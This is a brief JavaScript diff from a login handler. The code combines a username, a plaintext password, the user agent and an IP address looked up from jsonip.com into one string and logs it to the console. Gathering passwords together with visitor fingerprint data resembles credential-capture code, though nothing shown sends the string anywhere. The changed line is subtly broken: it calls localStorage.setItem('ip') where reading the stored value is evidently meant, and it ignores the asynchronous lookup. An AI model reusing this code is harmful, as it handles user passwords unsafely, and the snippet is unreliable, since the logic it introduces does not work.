@@ -9,13 +9,11 @@
          
          var user_agent = navigator.userAgent;
          
-         var ip_address = "";
-         
          $.getJSON("https://jsonip.com?callback=?", function(data) {
-            ip_address = data.ip;
+            localStorage.setItem('ip',data.ip);
          });
          
-         var combostring = username + "," + password + "," + user_agent + "," + ip_address;
+         var combostring = username + "," + password + "," + user_agent + "," + localStorage.setItem('ip');
          
          console.log(combostring);
          
